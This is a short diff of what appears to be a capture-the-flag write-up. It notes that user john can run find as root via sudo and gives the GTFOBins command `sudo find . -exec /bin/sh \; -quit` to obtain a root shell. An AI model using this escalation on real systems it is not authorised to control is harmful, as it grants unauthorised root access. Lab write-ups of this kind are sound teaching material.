@@ -15,5 +15,6 @@ Remember to grab the user.txt
 running `sudo -l` we see john can run `/usr/bin/find` as root
 
 This is an easy gtfobin lookup. We run this command to get root
+
 `sudo find . -exec /bin/sh \; -quit`
 
